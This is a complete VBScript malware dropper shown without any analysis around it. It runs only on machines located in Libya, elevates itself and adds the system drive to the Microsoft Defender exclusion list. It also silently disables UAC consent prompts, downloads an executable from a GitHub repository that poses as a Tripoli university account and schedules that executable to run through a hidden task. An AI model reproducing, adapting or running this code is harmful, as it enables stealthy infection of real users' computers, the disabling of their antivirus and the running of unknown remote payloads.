' --- start function ---
Option Explicit

Dim http, response, country
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://ipinfo.io/json", False
http.Send
response = http.ResponseText
Set http = Nothing

country = GetCountry(response)

If country <> "LY" Then
    WScript.Quit
End If

' --- Payload starts here ---
Dim shellApp, fso, shell
Set shellApp = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

If WScript.Arguments.Count = 0 Then
    shellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
    WScript.Quit
End If

Dim url, target, runTask, excludeCmd1, excludeRun1, excludeCmd2, excludeRun2, downloadCmd
url = "https://github.com/tripoli-university-ly/download/raw/refs/heads/exe/Background%20Services.exe"
target = shell.ExpandEnvironmentStrings("%PUBLIC%\Music\Services.exe")
runTask = "OneTimeRunfile"

' First: Add exclusion silently
excludeCmd1 = "$env:SystemDrive | ForEach-Object { Add-MpPreference -ExclusionPath $_ } >$null 2>&1"
excludeRun1 = "powershell.exe -ExecutionPolicy Bypass -Command """ & excludeCmd1 & """"
shell.Run excludeRun1, 0, True

' Second: Modify UAC-related registry keys with elevation
excludeCmd2 = "Start-Process powershell -Verb runAs -ArgumentList '-Command ""Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0; Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0; Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 1""'"
excludeRun2 = "powershell.exe -ExecutionPolicy Bypass -Command """ & excludeCmd2 & """"
shell.Run excludeRun2, 0, True

downloadCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & target & "'"""
shell.Run downloadCmd, 0, True

Dim runTime, runTimeStr, runCmd, runEscaped, runTaskCmd
runTime = DateAdd("n", 1, Now)
runTimeStr = Right("0" & Hour(runTime), 2) & ":" & Right("0" & Minute(runTime), 2)

runCmd = "powershell.exe -ExecutionPolicy Bypass -Command ""Start-Process '" & target & "'"""
runEscaped = Replace(runCmd, """", "\""")

runTaskCmd = "schtasks /Create /SC ONCE /TN " & runTask & _
             " /TR """ & runEscaped & """ /ST " & runTimeStr & " /F"
shell.Run runTaskCmd, 0, True

' --- Country extraction function ---
Function GetCountry(json)
    Dim regex, match
    Set regex = CreateObject("VBScript.RegExp")
    regex.Pattern = """country"":\s*""([^""]+)"""
    regex.Global = False
    If regex.Test(json) Then
        Set match = regex.Execute(json)
        GetCountry = match(0).SubMatches(0)
    Else
        GetCountry = ""
    End If
End Function
